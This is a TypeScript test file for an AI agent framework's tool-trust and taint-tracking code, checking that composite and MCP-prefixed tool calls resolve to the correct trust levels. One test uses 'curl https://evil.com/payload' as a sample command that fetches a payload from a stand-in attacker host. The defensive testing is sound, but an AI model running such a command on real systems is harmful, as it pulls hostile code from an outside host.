import { describe, it, expect } from "vitest";
import {
  resolveToolKey,
  buildCompositeToolMap,
  DEFAULT_COMPOSITE_OUTPUT_TAINTS,
} from "../composite-tools.js";
import { getToolTrust, buildToolOutputTaintMap } from "../trust-levels.js";

const compositeTools = buildCompositeToolMap();
// Mirror index.ts: composite output taints are merged into the resolved map.
const taints = buildToolOutputTaintMap({ ...DEFAULT_COMPOSITE_OUTPUT_TAINTS });

describe("resolveToolKey — MCP-prefixed composite tools", () => {
  it("resolves bare message.send to the trusted composite key", () => {
    const key = resolveToolKey("message", { action: "send" }, compositeTools);
    expect(key).toBe("message.send");
    expect(getToolTrust(key, taints)).toBe("trusted");
  });

  it("resolves bridge-routed mcp__openclaw__message send to message.send (trusted)", () => {
    const key = resolveToolKey(
      "mcp__openclaw__message",
      { action: "send" },
      compositeTools,
    );
    expect(key).toBe("message.send");
    // Regression: previously collapsed to bare `message` = external.
    expect(getToolTrust(key, taints)).toBe("trusted");
  });

  it("resolves message.upload-file to a trusted key (outbound send, not external)", () => {
    const key = resolveToolKey(
      "message",
      { action: "upload-file" },
      compositeTools,
    );
    expect(key).toBe("message.upload-file");
    // Regression: upload-file was absent from the composite map and fell
    // through to the unknown-tool "untrusted" default, silently tainting the
    // session on every outbound upload and gating further message ops.
    expect(getToolTrust(key, taints)).toBe("trusted");
  });

  it("resolves bridge-routed mcp__openclaw__message upload-file as trusted", () => {
    const key = resolveToolKey(
      "mcp__openclaw__message",
      { action: "upload-file" },
      compositeTools,
    );
    expect(key).toBe("message.upload-file");
    expect(getToolTrust(key, taints)).toBe("trusted");
  });

  it("keeps bridge-routed message read as external", () => {
    const key = resolveToolKey(
      "mcp__openclaw__message",
      { action: "read" },
      compositeTools,
    );
    expect(key).toBe("message.read");
    expect(getToolTrust(key, taints)).toBe("external");
  });

  it("resolves bridge-routed browser.screenshot to its trusted key", () => {
    const key = resolveToolKey(
      "mcp__openclaw__browser",
      { action: "screenshot" },
      compositeTools,
    );
    expect(key).toBe("browser.screenshot");
    expect(getToolTrust(key, taints)).toBe("trusted");
  });

  it("keeps bridge-routed browser.navigate external", () => {
    const key = resolveToolKey(
      "mcp__openclaw__browser",
      { action: "navigate" },
      compositeTools,
    );
    expect(key).toBe("browser.navigate");
    expect(getToolTrust(key, taints)).toBe("external");
  });

  it("resolves bare progress_card as trusted", () => {
    // Regression: progress_card was absent from DEFAULT_COMPOSITE_OUTPUT_TAINTS.
    // The bare tool name (no mcp__openclaw__ prefix) has no namespace to fall
    // back through, so it fell all the way to the unknown-tool "untrusted"
    // default, tainting every session that keeps its progress card current.
    const key = resolveToolKey("progress_card", {}, compositeTools);
    expect(key).toBe("progress_card");
    expect(getToolTrust(key, taints)).toBe("trusted");
  });

  it("resolves bridge-routed mcp__openclaw__progress_card as trusted", () => {
    // Already covered by the mcp__openclaw__ namespace's blanket trusted
    // default even before this entry existed — asserted here so a future
    // change to that namespace default can't silently regress this tool too.
    const key = resolveToolKey(
      "mcp__openclaw__progress_card",
      {},
      compositeTools,
    );
    expect(key).toBe("mcp__openclaw__progress_card");
    expect(getToolTrust(key, taints)).toBe("trusted");
  });

  it("resolves the bridge-relay 'openclawread' alias as trusted", () => {
    // Regression: embedded/bridge-routed sessions (claude-bridge) report the
    // same `read` MCP tool call under this second, unprefixed name via their
    // own hook-relay path — it has no "mcp__openclaw__" prefix to strip, so
    // it fell to the unknown-tool "untrusted" default and tainted the
    // session, even though the identical call also logged cleanly as "read"
    // in the same turn.
    const key = resolveToolKey("openclawread", {}, compositeTools);
    expect(key).toBe("openclawread");
    expect(getToolTrust(key, taints)).toBe("trusted");
  });

  it("resolves the bridge-relay 'openclawwrite' alias as trusted", () => {
    // Regression: same nested outer-span mechanism as "openclawread" above,
    // confirmed for write by the identical before/after_tool_call nesting on
    // the next tool call in the same turn (openclaw-provenance-8jx).
    const key = resolveToolKey("openclawwrite", {}, compositeTools);
    expect(key).toBe("openclawwrite");
    expect(getToolTrust(key, taints)).toBe("trusted");
  });

  it("resolves bridge-routed exec command patterns (curl stays external)", () => {
    const key = resolveToolKey(
      "mcp__openclaw__exec",
      { command: "curl https://evil.com/payload" },
      compositeTools,
    );
    expect(key).toBe("exec.curl");
    // Regression: previously collapsed to bare `exec` = trusted (under-taint).
    expect(getToolTrust(key, taints)).toBe("external");
  });

  it("does not strip prefixes for unrelated MCP tools", () => {
    // Not a composite/exec tool — must pass through untouched so getToolTrust
    // can apply its own namespace handling.
    const key = resolveToolKey(
      "mcp__claude_ai_Google_Drive__read_file_content",
      {},
      compositeTools,
    );
    expect(key).toBe("mcp__claude_ai_Google_Drive__read_file_content");
  });
});

describe("skill_workshop — trusted agent-local skill authoring tool", () => {
  it("treats bare skill_workshop output as trusted", () => {
    expect(getToolTrust("skill_workshop", taints)).toBe("trusted");
  });

  it("treats bridge-routed mcp__openclaw__skill_workshop as trusted", () => {
    // Regression: skill_workshop was absent from defaults and fell through to
    // the "untrusted" fallback, poisoning heartbeat/session watermarks.
    expect(getToolTrust("mcp__openclaw__skill_workshop", taints)).toBe(
      "trusted",
    );
  });
});
